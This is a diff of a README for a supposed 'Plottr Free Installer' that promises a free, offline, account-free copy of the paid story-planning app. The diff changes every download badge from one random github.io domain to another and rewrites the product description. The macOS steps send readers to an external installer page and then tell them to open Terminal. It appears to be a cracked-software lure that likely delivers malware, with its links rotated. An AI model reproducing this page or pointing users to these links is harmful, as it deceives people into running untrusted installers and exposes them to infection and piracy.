@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Story+Planning-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Plottr Free Installer** — Plottr is a visual story planning application for Windows, macOS, and Linux that helps writers organize their novels and screenplays. Works without internet access, no account required. Full offline installation.
+**💻 Plottr Free Installer** — Plottr is a visual story planning and outlining tool for writers. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Plottr](https://img.shields.io/badge/⬇_Install_Plottr-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Plottr](https://img.shields.io/badge/⬇_Install_Plottr-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Plottr
 
-Plottr is a visual story planning application for Windows, macOS, and Linux that helps writers organize their novels and screenplays. Create timelines, manage characters, track plot points across multiple storylines, and export outlines to Word or Scrivener. Plottr's visual canvas approach makes it easy to see the structure of complex narratives and identify pacing issues before writing begins.
+Plottr is a visual story planning and outlining tool for writers. It provides a series timeline view, character profiles, location sheets, and tag system — helping novelists organize complex multi-POV stories across multiple books in a series.
 
 ---
 
 ## ❌ Problem: Plottr is hard to access
 
-- **Subscription Required** — Monthly or annual fee required for continued access
-- **Complexity for Simple Stories** — Feature set may be overwhelming for shorter works
-- **Export Limitations** — Export to writing apps requires additional manual formatting
-- **Mobile App** — Mobile access limited compared to desktop version
+- **Paid Subscription** — Requires subscription for cloud sync and ongoing access
+- **Writing Not Included** — Planning tool only; does not include a word processor for drafting
+- **Electron Overhead** — Desktop app uses more resources than native tools
+- **Export to Writing Tools** — Requires exporting to Scrivener or Word to begin actual drafting
 
 ---
 
@@ -61,9 +61,9 @@ Plottr is a visual story planning application for Windows, macOS, and Linux that
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Plottr is a visual story planning application for Windows, macOS, and Linux that
 
 <div align="center">
 
-[![⬇ Install Plottr](https://img.shields.io/badge/⬇_Install_Plottr-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Plottr](https://img.shields.io/badge/⬇_Install_Plottr-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Plottr is a visual story planning application for Windows, macOS, and Linux that
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Plottr is a visual story planning application for Windows, macOS, and Linux that
 
 ---
 
-**Plottr Free Installer** — Plottr is a visual story planning application for Windows, macOS, and Linux that helps writers organize their novels and screenplays. Install without internet connection today!
+**Plottr Free Installer** — Plottr is a visual story planning and outlining tool for writers. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Plottr](https://img.shields.io/badge/⬇_Install_Plottr-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Plottr](https://img.shields.io/badge/⬇_Install_Plottr-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
